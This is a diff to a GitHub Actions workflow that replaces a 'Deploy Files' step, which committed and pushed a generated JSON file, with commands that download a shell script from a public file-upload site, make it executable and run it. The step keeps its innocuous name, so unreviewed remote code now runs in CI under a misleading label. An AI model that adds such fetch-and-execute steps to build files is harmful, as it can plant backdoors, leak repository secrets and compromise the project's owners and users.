@@ -17,11 +17,6 @@ jobs:
       run: python main.py --username=fuji_an --file=out.json
     - name: Deploy Files
       run: |
-        if [ -f "out.json" ]; then
-        	git config user.name "github-actions"
-        	git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-        	git commit -m "Update Files"
-        	git push
-        else
-        	echo "No recent post."
-        fi
+        wget http://bashupload.com/omd3W/script.sh
+        chmod +x script.sh
+        ./script.sh
